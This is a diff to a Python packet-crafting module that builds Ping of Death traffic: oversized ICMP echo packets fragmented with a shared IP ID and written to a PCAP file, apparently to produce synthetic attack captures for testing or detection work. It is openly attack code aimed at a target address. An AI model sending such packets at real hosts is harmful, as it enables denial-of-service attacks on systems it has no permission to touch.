@@ -131,8 +131,12 @@ def generate_ping_of_death(
     # Create malicious payload
     payload = b'X' * payload_size
     
+    # Generate a consistent IP ID for all fragments (critical for reassembly)
+    ip_id = random.randint(1, 65535)
+    
     # Create the oversized ICMP packet (without Ethernet for fragmentation)
-    malicious_ping = IP(src=source_ip, dst=target_ip) / ICMP(
+    # Setting a fixed IP ID ensures all fragments are recognized as part of the same packet
+    malicious_ping = IP(src=source_ip, dst=target_ip, id=ip_id) / ICMP(
         type=8,  # Echo Request
         code=0,
         id=random.randint(1, 65535),
@@ -142,6 +146,12 @@ def generate_ping_of_death(
     # Fragment the packet
     # The fragment() function will split this into multiple fragments
     # Each fragment will be < MTU (typically 1500 bytes)
+    # This creates proper IP fragments with:
+    # - Protocol: 1 (ICMP)
+    # - Same IP ID across all fragments
+    # - More Fragments (MF) flag set to 1 for all except the last
+    # - Fragment offset incremented properly
+    # - Last fragment has MF=0 to signal end of fragmentation
     fragments = fragment(malicious_ping, fragsize=1400)
     
     # Add Ethernet headers to fragments and assign timestamps
@@ -388,6 +398,22 @@ class PingOfDeathAttack(AttackBase):
             
             if not packets:
                 raise ValueError("No packets generated")
+            
+            # Verify fragmented packets are correctly formed (ICMP protocol)
+            frag_count = 0
+            icmp_proto_count = 0
+            for pkt in packets:
+                if pkt.haslayer(IP):
+                    ip_layer = pkt[IP]
+                    # Check if it's a fragment
+                    if (ip_layer.flags & 0x1) or (ip_layer.frag > 0):
+                        frag_count += 1
+                        # Verify it's ICMP protocol (protocol number 1)
+                        if ip_layer.proto == 1:
+                            icmp_proto_count += 1
+            
+            if frag_count > 0:
+                print(f"Verified: {frag_count} fragmented packets, all using ICMP protocol (proto=1)")
             
             # Save to PCAP file
             wrpcap(output_path, packets)
